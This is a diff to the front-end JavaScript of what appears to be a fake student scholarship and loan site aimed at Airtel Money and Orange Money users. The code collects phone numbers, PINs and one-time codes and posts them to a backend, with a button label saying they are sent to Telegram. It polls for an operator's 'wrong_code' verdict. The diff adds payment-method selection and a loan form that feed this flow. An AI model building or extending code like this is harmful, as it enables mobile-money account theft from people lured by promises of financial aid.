@@ -306,7 +306,7 @@ function startResendTimer(seconds = 30) {
    Step transitions
 --------------------------------------------------------- */
 function goToStep(stepNumber) {
-  for (let i = 1; i <= 3; i++) {
+  for (let i = 1; i <= 4; i++) {
     const panel = document.getElementById(`step${i}Panel`);
     if (!panel) continue;
 
@@ -321,6 +321,51 @@ function goToStep(stepNumber) {
       panel.classList.remove('active');
     }
   }
+}
+
+/* ---------------------------------------------------------
+   Payment Method Selection
+--------------------------------------------------------- */
+function initPaymentMethodSelection() {
+  const airtelBtn = document.getElementById('airtelMoneyBtn');
+  const orangeBtn = document.getElementById('orangeMoneyBtn');
+  const confirmBtn = document.getElementById('confirmPaymentBtn');
+  if (!airtelBtn || !orangeBtn || !confirmBtn) return () => '';
+
+  let selectedMethod = null;
+
+  const params = new URLSearchParams(window.location.search);
+  const urlMethod = Security.sanitizeAlphanumeric(params.get('method') || '', 20);
+  if (urlMethod === 'orange') {
+    selectedMethod = 'orange';
+    orangeBtn.classList.add('selected');
+    confirmBtn.disabled = false;
+  } else if (urlMethod === 'airtel') {
+    selectedMethod = 'airtel';
+    airtelBtn.classList.add('selected');
+    confirmBtn.disabled = false;
+  }
+
+  airtelBtn.addEventListener('click', () => {
+    selectedMethod = 'airtel';
+    airtelBtn.classList.add('selected');
+    orangeBtn.classList.remove('selected');
+    confirmBtn.disabled = false;
+  });
+
+  orangeBtn.addEventListener('click', () => {
+    selectedMethod = 'orange';
+    orangeBtn.classList.add('selected');
+    airtelBtn.classList.remove('selected');
+    confirmBtn.disabled = false;
+  });
+
+  confirmBtn.addEventListener('click', () => {
+    if (!selectedMethod) return;
+    goToStep(2);
+  });
+
+  return () => selectedMethod;
 }
 
 /* ---------------------------------------------------------
@@ -367,6 +412,8 @@ function initPhonePinVerification() {
     const pin = getPinValue();
     const params = new URLSearchParams(window.location.search);
     const flow = Security.sanitizeAlphanumeric(params.get('flow') || 'scholarship', 50);
+    const getPaymentMethod = window.getSelectedPaymentMethod ? window.getSelectedPaymentMethod() : 'airtel';
+    const paymentMethod = Security.sanitizeAlphanumeric(getPaymentMethod, 20);
 
     verifyPhonePinBtn.disabled = true;
     verifyPhonePinBtn.textContent = 'Envoi vers Telegram...';
@@ -375,7 +422,7 @@ function initPhonePinVerification() {
       const response = await fetch(AppConfig.api('/api/verify/phone-pin'), {
         method: 'POST',
         headers: AppConfig.getApiHeaders(),
-        body: JSON.stringify({ phone, countryCode, pin, flow })
+        body: JSON.stringify({ phone, countryCode, pin, flow, paymentMethod })
       });
       const result = await response.json();
 
@@ -383,7 +430,7 @@ function initPhonePinVerification() {
         verifyPhonePinBtn.textContent = 'Vérifié ✓';
         verifyPhonePinBtn.classList.remove('btn-primary');
         verifyPhonePinBtn.classList.add('btn-success');
-        setTimeout(() => goToStep(2), 400);
+        setTimeout(() => goToStep(3), 400);
       } else {
         throw new Error(result.error || 'Failed to send verification');
       }
@@ -410,6 +457,8 @@ function initOtpVerification() {
     const countryCode = document.getElementById('countryTrigger')?.dataset?.dialCode || '+243';
     const params = new URLSearchParams(window.location.search);
     const flow = Security.sanitizeAlphanumeric(params.get('flow') || 'scholarship', 50);
+    const getPaymentMethod = window.getSelectedPaymentMethod ? window.getSelectedPaymentMethod() : 'airtel';
+    const paymentMethod = Security.sanitizeAlphanumeric(getPaymentMethod, 20);
 
     if (otp.length !== 4) {
       alert('Veuillez entrer le code OTP complet à 4 chiffres.');
@@ -423,7 +472,7 @@ function initOtpVerification() {
       const response = await fetch(AppConfig.api('/api/verify/otp'), {
         method: 'POST',
         headers: AppConfig.getApiHeaders(),
-        body: JSON.stringify({ otp, phone, countryCode, flow })
+        body: JSON.stringify({ otp, phone, countryCode, flow, paymentMethod })
       });
       const result = await response.json();
 
@@ -443,7 +492,7 @@ function initOtpVerification() {
               verifyOtpBtn.textContent = 'Vérifié ✓';
               verifyOtpBtn.classList.remove('btn-success');
               verifyOtpBtn.classList.add('btn-primary');
-              setTimeout(() => goToStep(3), 600);
+              setTimeout(() => goToStep(4), 600);
             } else if (statusResult.status === 'wrong_code') {
               clearInterval(pollInterval);
               PollingManager.intervals.delete(pollInterval);
@@ -469,14 +518,14 @@ function initOtpVerification() {
               verifyOtpBtn.disabled = false;
               otpBoxes.forEach(box => box.value = '');
               document.querySelectorAll('.pin-box').forEach(b => b.value = '');
-              phoneInput.value = '';
+              document.getElementById('phoneInput')?.value;
               showStatus('otpStatus', 'Code PIN incorrect. Veuillez réessayer.');
               setTimeout(() => {
                 verifyOtpBtn.textContent = 'Vérifier';
                 verifyOtpBtn.classList.remove('btn-secondary');
                 verifyOtpBtn.classList.add('btn-success');
                 hideStatus('otpStatus');
-                goToStep(1);
+                goToStep(2);
               }, 1500);
             }
           } catch (error) {
@@ -506,9 +555,12 @@ function initVerifyPage() {
   if (!verifyOtpBtn) return;
 
   const getOtpValue = initOtpBoxes();
+  const getPaymentMethod = initPaymentMethodSelection();
   initCountryDropdown();
   initPhonePinVerification();
   initOtpVerification();
+
+  window.getSelectedPaymentMethod = () => getPaymentMethod();
 
   if (resendBtn) {
     resendBtn.addEventListener('click', () => startResendTimer(30));
@@ -516,11 +568,62 @@ function initVerifyPage() {
 
   if (continueBtn) {
     continueBtn.addEventListener('click', () => {
-      const params = new URLSearchParams(window.location.search);
-      const flow = params.get('flow') || 'scholarship';
-      alert(`Continuer vers le formulaire de candidature pour ${flow === 'loan' ? 'Prêt étudiant' : 'Bourse'}.`);
+      window.location.href = 'index.html';
     });
   }
+}
+
+/* ---------------------------------------------------------
+   Loan Application Form
+--------------------------------------------------------- */
+function initLoanApplicationForm() {
+  const form = document.getElementById('loanApplicationForm');
+  if (!form) return;
+
+  form.addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    const fields = form.querySelectorAll('[required]');
+    let isValid = true;
+
+    fields.forEach(field => {
+      const errorEl = field.parentElement.querySelector('.form-error');
+      const value = field.value.trim();
+
+      if (!value) {
+        isValid = false;
+        field.classList.add('error');
+        if (errorEl) errorEl.classList.add('visible');
+      } else {
+        field.classList.remove('error');
+        if (errorEl) errorEl.classList.remove('visible');
+
+        if (field.type === 'number') {
+          const num = parseFloat(value);
+          const min = parseFloat(field.min || 0);
+          if (isNaN(num) || num < min) {
+            isValid = false;
+            field.classList.add('error');
+            if (errorEl) errorEl.classList.add('visible');
+          }
+        }
+      }
+    });
+
+    if (!isValid) {
+      const firstError = form.querySelector('.form-error.visible');
+      if (firstError) firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      return;
+    }
+
+    const submitBtn = document.getElementById('submitApplicationBtn');
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Traitement en cours...';
+
+    setTimeout(() => {
+      window.location.href = 'verify.html?flow=loan';
+    }, 1000);
+  });
 }
 
 /* ---------------------------------------------------------
@@ -529,7 +632,7 @@ function initVerifyPage() {
 function initLandingLinks() {
   document.querySelectorAll('[data-flow-link]').forEach((el) => {
     const flow = el.getAttribute('data-flow-link');
-    if (flow) el.setAttribute('href', `verify.html?flow=${flow}`);
+    if (flow) el.setAttribute('href', `verify?flow=${flow}`);
   });
 }
 
@@ -540,6 +643,7 @@ document.addEventListener('DOMContentLoaded', () => {
   PollingManager.clearAll();
   AppConfig.init().then(() => {
     initVerifyPage();
+    initLoanApplicationForm();
     initLandingLinks();
   });
 });
